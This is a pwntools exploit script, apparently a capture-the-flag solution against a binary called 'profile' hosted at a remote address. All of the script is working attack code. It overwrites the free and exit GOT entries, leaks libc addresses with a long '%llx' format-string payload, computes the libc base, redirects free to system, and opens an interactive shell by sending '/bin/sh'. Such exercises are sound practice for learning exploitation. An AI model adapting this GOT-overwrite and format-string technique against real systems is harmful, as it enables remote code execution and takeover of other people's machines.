#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('profile', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or '54.78.163.105'
	port = int(args.PORT or 30337)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *get_string+84
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

# overwrite free with main
sla(b'Age: ', str(0x40401837AABBCC).encode())
sla(b'Name: ', p64(0x40138C).strip(b'\x00'))

# overwrite exit with main
sla(b'Age: ', str(0x40406837AABBCC).encode())
sla(b'Name: ', p64(0x40138C).strip(b'\x00'))

# overwrite free with printf
sla(b'Age: ', str(0x40401837AABBCC).encode())
sla(b'Name: ', p64(0x401060).strip(b'\x00'))

sla(b'Age: ', str(0x1337).encode())
sla(b'Name: ', b'%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.MARKER')

ru(b'----------------\n')
ru(b'----------------\n')

leak = ru(b'MARKER').decode()
li(f'{leak}')

parts = leak.split('.')
libc_leak = int(parts[-3], 16)
ls(f'libc_leak {libc_leak:#x}')
libc_base = libc_leak -0x29d90
ls(f'libc_base {libc_base:#x}')

libc = ELF("./libc.so.6")
libc.address = libc_base

# overwrite free with system
sla(b'Age: ', str(0x40401837AABBCC).encode())
sla(b'Name: ', p64(libc.symbols.system).strip(b'\x00'))

sla(b'Age: ', str(0x1337).encode())
sla(b'Name: ', b'/bin/sh')

ia()
